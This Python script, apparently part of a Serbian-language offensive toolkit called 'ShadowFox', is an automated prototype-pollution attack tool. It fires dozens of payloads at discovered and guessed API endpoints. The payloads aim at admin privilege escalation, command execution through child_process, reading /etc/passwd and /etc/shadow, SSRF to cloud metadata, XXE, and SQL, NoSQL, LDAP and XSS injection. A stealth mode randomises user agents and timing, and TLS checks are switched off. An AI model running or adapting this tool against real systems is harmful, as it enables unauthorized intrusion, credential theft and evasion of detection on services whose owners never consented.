#!/usr/bin/env python3
"""
🦊 SHADOWFOX PROTOTYPE POLLUTION ATTACK MODULE
Specijalizovani modul za JS/Node Prototype Pollution exploite
Autor: Whitefox980 | Verzija: 2025.06.06
"""

import requests
import json
import time
import random
from urllib.parse import urljoin, urlparse
import warnings
warnings.filterwarnings("ignore", category=requests.packages.urllib3.exceptions.InsecureRequestWarning)

class PrototypePollutionAttack:
    def __init__(self):
        self.session = requests.Session()
        self.results = {
            "mission_info": {},
            "attack_results": [],
            "successful_pollutions": [],
            "payload_variations": [],
            "endpoint_results": {},
            "statistics": {}
        }
        self.meta_config = {}
        self.recon_data = {}
        
        # Prototype Pollution payloads - verschiedene Variationen
        self.pollution_payloads = [
            # Klassische __proto__ Pollution
            {"__proto__": {"admin": True}},
            {"__proto__": {"isAdmin": True}},
            {"__proto__": {"role": "admin"}},
            {"__proto__": {"privileged": True}},
            {"__proto__": {"authorized": True}},
            
            # Constructor Pollution
            {"constructor": {"prototype": {"admin": True}}},
            {"constructor": {"prototype": {"isAdmin": True}}},
            
            # Nested Object Pollution  
            {"user": {"__proto__": {"admin": True}}},
            {"profile": {"__proto__": {"role": "admin"}}},
            {"settings": {"__proto__": {"privileged": True}}},
            
            # Array-based Pollution
            {"__proto__": {"length": 0}},
            {"__proto__": {"push": "polluted"}},
            
            # Deep Nested Pollution
            {"level1": {"level2": {"__proto__": {"admin": True}}}},
            {"config": {"options": {"__proto__": {"debug": True}}}},
            
            # Bypass Attempts
            {"__pro__to__": {"admin": True}},
            {"__proto__": {"admin": True}},
            {"__proto__.admin": True},
            
            # RCE Attempts via Pollution
            {"__proto__": {"shell": "require('child_process').exec('id')"}},
            {"__proto__": {"eval": "global.process.mainModule.require('child_process').execSync('whoami')"}},
            
            # Template Injection via Pollution
            {"__proto__": {"template": "{{constructor.constructor('return process')().mainModule.require('child_process').execSync('id')}}"}},
            
            # File System Access
            {"__proto__": {"fs": "require('fs').readFileSync('/etc/passwd', 'utf8')"}},
            
            # Environment Variables
            {"__proto__": {"env": "process.env"}},
            
            # XSS via Pollution
            {"__proto__": {"xss": "<script>alert('XSS via Prototype Pollution')</script>"}},
            
            # SQL Injection via Pollution
            {"__proto__": {"query": "' OR 1=1 --"}},
            {"__proto__": {"where": "1=1"}},
            
            # Authentication Bypass
            {"__proto__": {"authenticated": True}},
            {"__proto__": {"session": {"valid": True}}},
            {"__proto__": {"token": "admin_token"}},
            
            # LDAP Injection
            {"__proto__": {"filter": "*)(uid=*))(|(uid=*"}},
            
            # NoSQL Injection
            {"__proto__": {"$where": "function(){return true}"}},
            {"__proto__": {"$regex": ".*"}},
            
            # Path Traversal
            {"__proto__": {"path": "../../../etc/passwd"}},
            {"__proto__": {"file": "../../../../etc/shadow"}},
            
            # SSRF via Pollution
            {"__proto__": {"url": "http://169.254.169.254/latest/meta-data/"}},
            {"__proto__": {"endpoint": "http://localhost:8080/admin"}},
            
            # XXE via Pollution
            {"__proto__": {"xml": "<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>"}},
            
            # Deserialization Attacks
            {"__proto__": {"serialize": "O:8:\\\"stdClass\\\":1:{s:4:\\\"test\\\";s:4:\\\"pwnd\\\";}"}},
        ]
        
    def load_configs(self):
        """Učitava Meta config i Recon podatke"""
        try:
            with open('Meta/mission_info.json', 'r') as f:
                self.meta_config = json.load(f)
                self.results["mission_info"] = self.meta_config
                print(f"🧠 [META] Misija: {self.meta_config.get('mission_id', 'UNKNOWN')}")
        except FileNotFoundError:
            print("❌ [ERROR] Meta/mission_info.json nije pronađen!")
            exit(1)
            
        try:
            with open('ShadowRecon/shadow_recon.json', 'r') as f:
                self.recon_data = json.load(f)
                print(f"🔍 [RECON] Učitano {len(self.recon_data.get('discovered_endpoints', []))} endpoint-a")
        except FileNotFoundError:
            print("⚠️  [WARNING] shadow_recon.json nije pronađen, koristim targets.txt")
            
    def setup_session(self):
        """Konfiguracija sesije"""
        headers = self.meta_config.get('default_headers', {})
        self.session.headers.update(headers)
        self.session.headers['Content-Type'] = 'application/json'
        
        if self.meta_config.get('stealth_mode', False):
            user_agents = [
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"
            ]
            self.session.headers['User-Agent'] = random.choice(user_agents)
            
        self.session.verify = False
        self.session.timeout = 15
        
    def intelligent_delay(self):
        """Pametno kašnjenje između napada"""
        if self.meta_config.get('stealth_mode', False):
            delay = self.meta_config.get('rate_delay_seconds', 2.5)
            time.sleep(delay + random.uniform(0.5, 1.5))
        else:
            time.sleep(random.uniform(0.1, 0.5))
            
    def get_target_endpoints(self):
        """Uzima endpoint-e za testiranje"""
        endpoints = []
        
        # Iz recon podataka
        if self.recon_data and 'discovered_endpoints' in self.recon_data:
            for endpoint in self.recon_data['discovered_endpoints']:
                if endpoint.get('status_code') == 200:
                    endpoints.append(endpoint['url'])
                    
        # Iz targets.txt ako nema recon podataka
        if not endpoints:
            try:
                with open('targets.txt', 'r') as f:
                    endpoints = [line.strip() for line in f if line.strip()]
            except FileNotFoundError:
                print("❌ [ERROR] Nema dostupnih endpoint-a za testiranje!")
                return []
                
        # Dodaj uobičajene API endpoint-e
        base_urls = list(set([urlparse(url).scheme + "://" + urlparse(url).netloc for url in endpoints]))
        
        common_api_paths = [
            "/api/users", "/api/user", "/api/profile", "/api/settings",
            "/api/config", "/api/admin", "/api/auth", "/api/login",
            "/user/profile", "/user/settings", "/admin/config",
            "/graphql", "/api/graphql", "/api/v1/users", "/api/v2/users"
        ]
        
        for base_url in base_urls:
            for path in common_api_paths:
                full_url = base_url + path
                if full_url not in endpoints:
                    endpoints.append(full_url)
                    
        return endpoints[:50]  # Ograniči na 50 endpoint-a
        
    def test_prototype_pollution(self, endpoint, payload):
        """Test Prototype Pollution na endpoint-u"""
        result = {
            "endpoint": endpoint,
            "payload": payload,
            "method": "POST",
            "status_code": None,
            "response_length": 0,
            "pollution_detected": False,
            "pollution_indicators": [],
            "response_headers": {},
            "response_content": "",
            "error": None
        }
        
        try:
            self.intelligent_delay()
            
            # POST zahtev sa pollution payload-om
            response = self.session.post(endpoint, json=payload, timeout=15)
            
            result["status_code"] = response.status_code
            result["response_length"] = len(response.content)
            result["response_headers"] = dict(response.headers)
            result["response_content"] = response.text[:1000]  # Prva 1000 karaktera
            
            # Proveri indikatore Prototype Pollution-a
            pollution_indicators = self.detect_pollution_indicators(response)
            result["pollution_indicators"] = pollution_indicators
            result["pollution_detected"] = len(pollution_indicators) > 0
            
            if result["pollution_detected"]:
                print(f"🎯 [POLLUTION] DETEKTOVANA: {endpoint}")
                print(f"   Payload: {json.dumps(payload)}")
                print(f"   Indikatori: {', '.join(pollution_indicators)}")
                
                # Dodaj u uspešne napade
                self.results["successful_pollutions"].append(result.copy())
                
        except requests.exceptions.Timeout:
            result["error"] = "TIMEOUT"
            print(f"⏰ [TIMEOUT] {endpoint}")
        except requests.exceptions.ConnectionError:
            result["error"] = "CONNECTION_ERROR"
            print(f"🔌 [CONNECTION] {endpoint}")
        except Exception as e:
            result["error"] = str(e)
            print(f"❌ [ERROR] {endpoint}: {str(e)}")
            
        return result
        
    def detect_pollution_indicators(self, response):
        """Detektuje indikatore uspešne Prototype Pollution"""
        indicators = []
        response_text = response.text.lower()
        
        # JavaScript Error indikatori
        js_errors = [
            "cannot read property", "cannot read properties", 
            "typeerror", "referenceerror", "syntaxerror",
            "unexpected token", "proto", "constructor"
        ]
        
        for error in js_errors:
            if error in response_text:
                indicators.append(f"JS_ERROR: {error}")
                
        # Reflection indikatori
        reflection_signs = [
            "__proto__", "constructor", "prototype", 
            "admin", "isadmin", "privileged", "authorized"
        ]
        
        for sign in reflection_signs:
            if sign in response_text:
                indicators.append(f"REFLECTION: {sign}")
                
        # Server Error indikatori
        if response.status_code >= 500:
            indicators.append(f"SERVER_ERROR: {response.status_code}")
            
        # Response Time Anomaly (preko 5 sekundi)
        if hasattr(response, 'elapsed') and response.elapsed.total_seconds() > 5:
            indicators.append("SLOW_RESPONSE")
            
        # Content-Type promene
        content_type = response.headers.get('Content-Type', '')
        if 'application/json' not in content_type and 'text/html' in content_type:
            indicators.append("CONTENT_TYPE_CHANGE")
            
        # Stack Trace indikatori
        stack_traces = [
            "at object.", "at function", "stack trace", 
            "internal/modules", "node_modules"
        ]
        
        for trace in stack_traces:
            if trace in response_text:
                indicators.append(f"STACK_TRACE: {trace}")
                
        return indicators
        
    def test_get_pollution_verification(self, endpoint):
        """GET zahtev za verifikaciju da li je pollution uspešna"""
        try:
            self.intelligent_delay()
            response = self.session.get(endpoint)
            
            # Proveri da li postoje znakovi pollution-a u GET response-u
            pollution_signs = [
                "admin", "isadmin", "privileged", "authorized",
                "role", "debug", "shell", "eval"
            ]
            
            response_text = response.text.lower()
            found_signs = [sign for sign in pollution_signs if sign in response_text]
            
            if found_signs:
                return {
                    "verification_successful": True,
                    "found_pollution_signs": found_signs,
                    "response_snippet": response.text[:500]
                }
                
        except Exception as e:
            pass
            
        return {"verification_successful": False}
        
    def advanced_pollution_test(self, endpoint):
        """Napredni Prototype Pollution test sa različitim metodama"""
        advanced_results = []
        
        # Test različitih HTTP metoda
        methods = ['POST', 'PUT', 'PATCH']
        
        for method in methods:
            for payload in self.pollution_payloads[:10]:  # Top 10 payload-a
                try:
                    self.intelligent_delay()
                    
                    if method == 'POST':
                        response = self.session.post(endpoint, json=payload)
                    elif method == 'PUT':
                        response = self.session.put(endpoint, json=payload)
                    elif method == 'PATCH':
                        response = self.session.patch(endpoint, json=payload)
                        
                    result = {
                        "method": method,
                        "payload": payload,
                        "status_code": response.status_code,
                        "pollution_indicators": self.detect_pollution_indicators(response)
                    }
                    
                    if result["pollution_indicators"]:
                        advanced_results.append(result)
                        print(f"🔥 [ADVANCED] {method} pollution na {endpoint}")
                        
                except Exception as e:
                    continue
                    
        return advanced_results
        
    def run_pollution_attack(self):
        """Glavna Prototype Pollution attack operacija"""
        print("🦊 SHADOWFOX PROTOTYPE POLLUTION ATTACK")
        print("=" * 60)
        
        # 1. Učitaj konfiguracije
        self.load_configs()
        
        # 2. Podesi sesiju
        self.setup_session()
        
        # 3. Uzmi endpoint-e za testiranje
        endpoints = self.get_target_endpoints()
        print(f"🎯 [TARGET] Testiram {len(endpoints)} endpoint-a")
        print(f"💣 [PAYLOADS] {len(self.pollution_payloads)} Prototype Pollution payload-a")
        
        # 4. Pokreni napade
        total_tests = 0
        successful_pollutions = 0
        
        for endpoint in endpoints:
            print(f"\n🔍 [TESTING] {endpoint}")
            
            endpoint_results = []
            
            # Test osnovnih payload-a
            for i, payload in enumerate(self.pollution_payloads):
                result = self.test_prototype_pollution(endpoint, payload)
                endpoint_results.append(result)
                total_tests += 1
                
                if result["pollution_detected"]:
                    successful_pollutions += 1
                    
                    # Verifikacija sa GET zahtevom
                    verification = self.test_get_pollution_verification(endpoint)
                    result["verification"] = verification
                    
                    # Napredni testovi
                    advanced_results = self.advanced_pollution_test(endpoint)
                    result["advanced_results"] = advanced_results
                    
                # Progres
                if (i + 1) % 10 == 0:
                    print(f"   📊 {i + 1}/{len(self.pollution_payloads)} payload-a testiran")
                    
            self.results["endpoint_results"][endpoint] = endpoint_results
            
        # 5. Generisanje statistike
        self.generate_statistics(total_tests, successful_pollutions)
        
        # 6. Snimanje rezultata
        self.save_results()
        
        # 7. Prikaz sažetka
        self.display_summary()
        
    def generate_statistics(self, total_tests, successful_pollutions):
        """Generisanje statistike napada"""
        stats = {
            "total_tests": total_tests,
            "successful_pollutions": successful_pollutions,
            "success_rate": (successful_pollutions / total_tests * 100) if total_tests > 0 else 0,
            "endpoints_tested": len(self.results["endpoint_results"]),
            "payloads_used": len(self.pollution_payloads),
            "attack_timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
            "most_effective_payloads": []
        }
        
        # Najefektivniji payload-i
        payload_success_count = {}
        for pollution in self.results["successful_pollutions"]:
            payload_str = json.dumps(pollution["payload"], sort_keys=True)
            payload_success_count[payload_str] = payload_success_count.get(payload_str, 0) + 1
            
        sorted_payloads = sorted(payload_success_count.items(), key=lambda x: x[1], reverse=True)
        stats["most_effective_payloads"] = sorted_payloads[:5]
        
        self.results["statistics"] = stats
        
    def save_results(self):
        """Snimanje rezultata u attack_proto_pollution.json"""
        output_file = "Napad/attack_proto_pollution.json"
        
        try:
            with open(output_file, 'w') as f:
                json.dump(self.results, f, indent=2, ensure_ascii=False)
            print(f"💾 [SAVE] Rezultati snimljeni: {output_file}")
        except Exception as e:
            print(f"❌ [SAVE ERROR] {str(e)}")
            
    def display_summary(self):
        """Prikaz sažetka napada"""
        stats = self.results["statistics"]
        print("\n🎯 SHADOWFOX PROTOTYPE POLLUTION - SAŽETAK")
        print("=" * 60)
        print(f"🔬 Ukupno testova: {stats['total_tests']}")
        print(f"🎯 Uspešne pollution: {stats['successful_pollutions']}")
        print(f"📊 Stopa uspeha: {stats['success_rate']:.2f}%")
        print(f"🌐 Endpoint-a testiran: {stats['endpoints_tested']}")
        
        if stats['successful_pollutions'] > 0:
            print(f"\n🔥 KRITIČNI NALAZI:")
            for pollution in self.results["successful_pollutions"][:5]:
                print(f"   💥 {pollution['endpoint']}")
                print(f"      Payload: {json.dumps(pollution['payload'])}")
                print(f"      Indikatori: {', '.join(pollution['pollution_indicators'])}")
                
        if stats['most_effective_payloads']:
            print(f"\n🏆 NAJEFEKTIVNIJI PAYLOAD-I:")
            for payload_str, count in stats['most_effective_payloads']:
                print(f"   • {count}x: {payload_str}")
                
        print(f"\n✅ Detaljni rezultati: Napad/attack_proto_pollution.json")

def main():
    attack = PrototypePollutionAttack()
    attack.run_pollution_attack()

if __name__ == "__main__":
    main()
